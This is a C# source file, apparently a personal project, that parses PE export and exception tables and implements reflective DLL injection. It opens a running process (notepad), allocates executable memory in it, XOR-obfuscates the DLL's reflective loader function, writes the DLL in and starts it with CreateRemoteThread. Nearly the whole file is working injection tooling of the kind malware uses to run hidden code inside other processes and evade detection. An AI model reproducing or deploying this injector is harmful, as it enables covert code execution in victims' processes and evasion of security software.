using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

public class PeParser
{
    // DOS 头结构
    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_DOS_HEADER
    {
        public ushort e_magic;       // "MZ"
        public ushort e_cblp;
        public ushort e_cp;
        public ushort e_crlc;
        public ushort e_cparhdr;
        public ushort e_minalloc;
        public ushort e_maxalloc;
        public ushort e_ss;
        public ushort e_sp;
        public ushort e_csum;
        public ushort e_ip;
        public ushort e_cs;
        public ushort e_lfarlc;
        public ushort e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public ushort[] e_res1;
        public ushort e_oemid;
        public ushort e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public ushort[] e_res2;
        public int e_lfanew;          // 指向 NT 头的偏移
    }

    // NT 头（64位简化，实际可根据架构选择）
    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_NT_HEADERS64
    {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_FILE_HEADER
    {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_OPTIONAL_HEADER64
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public ulong SizeOfStackReserve;
        public ulong SizeOfStackCommit;
        public ulong SizeOfHeapReserve;
        public ulong SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        // Data Directories（固定 16 个条目）
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_SECTION_HEADER
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;          // 节名称（如 ".text"），不足8字节以0填充
        public uint VirtualSize;     // 节在内存中的实际大小
        public uint VirtualAddress;  // 节在内存中的 RVA
        public uint SizeOfRawData;   // 节在文件中的大小（对齐后）
        public uint PointerToRawData;// 节在文件中的偏移
        public uint PointerToRelocations;
        public uint PointerToLinenumbers;
        public ushort NumberOfRelocations;
        public ushort NumberOfLinenumbers;
        public uint Characteristics;  // 节属性（如可读、可写、可执行）
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_DATA_DIRECTORY
    {
        public uint VirtualAddress;
        public uint Size;
    }

    // 导出表结构
    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_EXPORT_DIRECTORY
    {
        public uint Characteristics;
        public uint TimeDateStamp;
        public ushort MajorVersion;
        public ushort MinorVersion;
        public uint Name;
        public uint Base;
        public uint NumberOfFunctions;
        public uint NumberOfNames;
        public uint AddressOfFunctions;
        public uint AddressOfNames;
        public uint AddressOfNameOrdinals;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct RUNTIME_FUNCTION
    {
        public uint BeginAddress;
        public uint EndAddress;
        public uint UnwindData;
    }

    public static uint[] GetFuncRawSize(byte[] dllBytes, string functionName)
    {
        uint[] func_info = new uint[2];
        GCHandle handle = GCHandle.Alloc(dllBytes, GCHandleType.Pinned);
        IntPtr ptr = handle.AddrOfPinnedObject();

        try
        {
            IMAGE_DOS_HEADER dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(ptr);
            if (dosHeader.e_magic != 0x5A4D) // "MZ"
                throw new Exception("Invalid DOS header");

            // NT 头位置
            IntPtr ntHeaderPtr = ptr + dosHeader.e_lfanew;
            uint signature = (uint)Marshal.ReadInt32(ntHeaderPtr);
            if (signature != 0x00004550) // "PE\0\0"
                throw new Exception("Invalid PE signature");

            // 读取可选头（64位版本）
            // 首先获取文件头，判断架构
            IMAGE_FILE_HEADER fileHeader = Marshal.PtrToStructure<IMAGE_FILE_HEADER>(ntHeaderPtr + 4);
            bool is64Bit = (fileHeader.Machine == 0x8664); // AMD64
            if (!is64Bit)
                throw new Exception("Only x64 is supported in this example");

            // 获取可选头指针
            IntPtr optHeaderPtr = ntHeaderPtr + 0x18; // 跳过 Signature(4) + FileHeader(20)
            IMAGE_OPTIONAL_HEADER64 optHeader = Marshal.PtrToStructure<IMAGE_OPTIONAL_HEADER64>(optHeaderPtr);

            // 获取导出表 RVA 和大小
            uint exportRva = optHeader.DataDirectory[0].VirtualAddress;
            if (exportRva == 0)
                throw new Exception("No export table found");

            // 定位导出表（需要将 RVA 转换为文件偏移）
            // 先获取节表
            IntPtr sectionHeaderPtr = optHeaderPtr + Marshal.SizeOf<IMAGE_OPTIONAL_HEADER64>();
            int sectionCount = fileHeader.NumberOfSections;
            uint exportOffset = RvaToOffset(dllBytes, sectionHeaderPtr, sectionCount, exportRva);

            // 读取导出表
            IntPtr exportDirPtr = ptr + (int)exportOffset;
            IMAGE_EXPORT_DIRECTORY exportDir = Marshal.PtrToStructure<IMAGE_EXPORT_DIRECTORY>(exportDirPtr);

            // 获取函数名表 RVA 并转为偏移
            uint namesRva = exportDir.AddressOfNames;
            uint namesOffset = RvaToOffset(dllBytes, sectionHeaderPtr, sectionCount, namesRva);
            uint ordinalsRva = exportDir.AddressOfNameOrdinals;
            uint ordinalsOffset = RvaToOffset(dllBytes, sectionHeaderPtr, sectionCount, ordinalsRva);
            uint functionsRva = exportDir.AddressOfFunctions;
            uint functionsOffset = RvaToOffset(dllBytes, sectionHeaderPtr, sectionCount, functionsRva);

            uint i = 0;
            uint functionRva = 0;
            uint functionEndRva = 0;
            // 遍历名称表
            for (; i < exportDir.NumberOfNames; i++)
            {
                uint namePtrRva = BitConverter.ToUInt32(dllBytes, (int)(namesOffset + i * 4));
                uint nameOffset = RvaToOffset(dllBytes, sectionHeaderPtr, sectionCount, namePtrRva);
                int start = (int)nameOffset;
                int length = 0;
                while (start + length < dllBytes.Length && dllBytes[start + length] != 0)
                {
                    length++;
                }
                string name = System.Text.Encoding.ASCII.GetString(dllBytes, (int)nameOffset, length);
                if (name == functionName)
                {
                    // 获取序号
                    ushort ordinalIndex = BitConverter.ToUInt16(dllBytes, (int)(ordinalsOffset + i * 2));
                    functionRva = BitConverter.ToUInt32(dllBytes, (int)(functionsOffset + ordinalIndex * 4));
                    break;
                }
            }
            if (functionRva == 0)
                throw new Exception("Function not found in exports");

            func_info[0] = RvaToOffset(dllBytes, sectionHeaderPtr, sectionCount, functionRva);


            if (optHeader.NumberOfRvaAndSizes <= 3) throw new Exception("No exception directory");
            IMAGE_DATA_DIRECTORY exceptionDir = optHeader.DataDirectory[3];
            if (exceptionDir.VirtualAddress == 0 || exceptionDir.Size == 0) throw new Exception("Exception directory empty");

            // 定位异常目录文件偏移
            uint exceptionOffset = RvaToOffset(dllBytes, sectionHeaderPtr, sectionCount, exceptionDir.VirtualAddress);
            int runtimeFuncCount = (int)(exceptionDir.Size / Marshal.SizeOf<RUNTIME_FUNCTION>());

            // 遍历 RUNTIME_FUNCTION 数组
            for (i = 0; i < runtimeFuncCount; i++)
            {
                IntPtr runtimeFuncPtr = ptr + (int)(exceptionOffset + i * Marshal.SizeOf<RUNTIME_FUNCTION>());
                RUNTIME_FUNCTION runtimeFunc = Marshal.PtrToStructure<RUNTIME_FUNCTION>(runtimeFuncPtr);
                if (runtimeFunc.BeginAddress == 0 && runtimeFunc.EndAddress == 0 && runtimeFunc.UnwindData == 0)
                    continue;

                // 比较起始 RVA（BeginAddress 本身就是 RVA）
                if (runtimeFunc.BeginAddress == functionRva)
                {
                    functionEndRva = runtimeFunc.EndAddress;
                }
            }

            if (functionEndRva == 0)
                throw new Exception("Function start RVA not found in exception directory");

            func_info[1] = functionEndRva - functionRva;
            return func_info;
        }
        finally
        {
            handle.Free();
        }

    }
    // 将 RVA 转换为文件偏移（基于节表）
    public static uint RvaToOffset(byte[] dllBytes, IntPtr sectionHeaderPtr, int sectionCount, uint rva)
    {
        // Marshal.SizeOf<IMAGE_SECTION_HEADER>()
        const int IMAGE_SIZEOF_SECTION_HEADER = 40;
        for (int i = 0; i < sectionCount; i++)
        {
            IntPtr sectionPtr = sectionHeaderPtr + i * IMAGE_SIZEOF_SECTION_HEADER;
            IMAGE_SECTION_HEADER section_header = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(sectionPtr);
            uint section_rva = section_header.VirtualAddress;
            uint section_raw = section_header.PointerToRawData;
            uint section_size = section_header.SizeOfRawData;

            if (rva >= section_rva && rva < section_rva + section_size)
            {
                return rva - section_rva + section_raw;
            }
        }
        throw new Exception("RVA not found in any section");
    }
}

public class ReflectiveInjector
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    public static bool Inject(string processName)
    {
        uint DLL_HEADER_SIZE = 0x10;
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length == 0)
        {
            return false;
        }

        IntPtr hProcess = OpenProcess(0x1F0FFF, false, processes[0].Id);

        byte[] dllBytes = File.ReadAllBytes("D:\\files\\projects\\ReflectiveDLL\\x64\\Release\\ReflectiveDLL.dll");

        uint[] yolo_info = PeParser.GetFuncRawSize(dllBytes, "_123321_asdf21425");
        uint[] rf_info = PeParser.GetFuncRawSize(dllBytes, "ReflectiveFunction");
        IntPtr dll_ptr = VirtualAlloc(IntPtr.Zero, (uint)(dllBytes.Length + DLL_HEADER_SIZE), 0x3000, 0x40);
        Marshal.Copy(dllBytes, 0, IntPtr.Add(dll_ptr, (int)DLL_HEADER_SIZE), (dllBytes.Length));

        byte[] magic = { 0x41, 0x42, 0x43, 0x44 };
        byte[] key = { 0xAF, 0x41, 0x33, 0xCC };
        long func_size = yolo_info[1];

        // 计算写入位置
        int currentOffset = 0;

        // 1. 写入 magic (4 字节)
        Marshal.Copy(magic, 0, IntPtr.Add(dll_ptr, currentOffset), magic.Length);
        currentOffset += magic.Length;

        // 2. 写入 key (4 字节)
        Marshal.Copy(key, 0, IntPtr.Add(dll_ptr, currentOffset), key.Length);
        currentOffset += key.Length;

        // 3. 写入 func_size (8 字节)
        byte[] sizeBytes = BitConverter.GetBytes(func_size);
        Marshal.Copy(sizeBytes, 0, IntPtr.Add(dll_ptr, currentOffset), sizeBytes.Length);

        // encrypt rf
        byte[] rf_data = IntPtrToByteArray(IntPtr.Add(dll_ptr, (int)(rf_info[0] + DLL_HEADER_SIZE)), (int)rf_info[1]);
        Ob_xor(rf_data, rf_info[1], key, 4);


        IntPtr remoteBase = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)(dllBytes.Length + DLL_HEADER_SIZE), 0x3000, 0x40); // MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
        if (remoteBase == IntPtr.Zero) return false;
        IntPtr bytesWritten;

        byte[] dll_data = IntPtrToByteArray(dll_ptr, (int)(dllBytes.Length + DLL_HEADER_SIZE));

        bool success = WriteProcessMemory(hProcess, remoteBase, dll_data, (uint)dllBytes.Length, out bytesWritten);
        if (!success) return false;
        IntPtr yoloAddr = IntPtr.Add(remoteBase, (int)(yolo_info[0] + DLL_HEADER_SIZE));

        uint threadId;
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, yoloAddr, IntPtr.Zero, 0, out threadId);
        if (hThread == IntPtr.Zero) return false;

        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    }

    public static byte[] IntPtrToByteArray(IntPtr ptr, int length)
    {
        if (ptr == IntPtr.Zero)
            throw new ArgumentException("NULL PTR");

        if (length <= 0)
            throw new ArgumentException("长度必须大于0");

        byte[] byteArray = new byte[length];
        Marshal.Copy(ptr, byteArray, 0, length);
        return byteArray;
    }

    public static void Ob_xor(byte[] begin, uint size, byte[] key, uint keySize)
    {
        for (uint i = 0; i < size; i++)
        {
            begin[i] = (byte)(begin[i] ^ key[i % keySize]);
        }
    }



    static void Main(string[] args)
    {
        ReflectiveInjector.Inject("notepad");
        Console.ReadKey();
    }
}